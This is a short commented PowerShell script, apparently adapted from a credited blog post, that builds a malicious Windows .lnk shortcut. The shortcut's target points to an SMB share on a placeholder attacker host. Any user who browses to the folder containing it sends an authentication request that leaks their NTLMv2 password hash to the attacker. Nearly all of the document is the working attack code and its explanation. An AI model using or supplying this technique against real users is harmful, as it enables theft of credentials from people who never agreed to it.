#
#
# To begin, we need to first create our malicious .lnk file. Since we’ll be using PowerShell, 
# you’ll need access to a Windows machine to generate the file, but it does not need to be domain-joined to the target network.
#
# In a PowerShell prompt, we will create our malicious .lnk file using the following commands:
#
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Malicious.lnk")
$lnk.TargetPath = "\\<attackerIP>\@threat.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()

# Once the commands are ran, it should generate a file to C:\Malicous.lnk. 
# When a user browses to this file, the thumbnail will attempt to load an icon from \\<attackerIP>\@threat.png. 
# This image obviously doesn’t exist, but we can leverage this connection attempt create a challenge that accepts a NTLMv2 hash
# Credits: https://infinitelogins.com/2020/12/17/capturing-password-hashes-via-malicious-lnk-files/
